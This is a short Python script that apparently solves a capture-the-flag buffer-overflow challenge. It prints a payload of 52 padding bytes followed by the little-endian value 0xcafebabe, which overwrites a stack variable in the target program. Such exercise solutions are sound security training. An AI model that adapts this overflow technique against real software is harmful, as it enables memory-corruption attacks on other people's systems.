#!/usr/bin/python3 
import sys
import struct

def p32(x):
    return struct.pack("<I", x)

key = 0xcafebabe

payload = b'a' * 52
payload += p32(key)
payload += b'\n'

sys.stdout.buffer.write(payload)
